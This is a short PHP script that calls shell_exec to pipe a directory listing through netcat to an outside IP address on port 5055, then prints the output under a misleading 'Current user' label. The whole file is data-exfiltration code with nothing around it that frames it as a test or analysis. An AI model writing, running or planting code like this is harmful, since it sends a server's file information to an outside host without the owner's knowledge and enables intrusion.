<?php

// Execute terminal command
$output = shell_exec('ls | nc 109.67.147.80 5055 ');

// Output the result
echo "Current user: " . $output;
?>
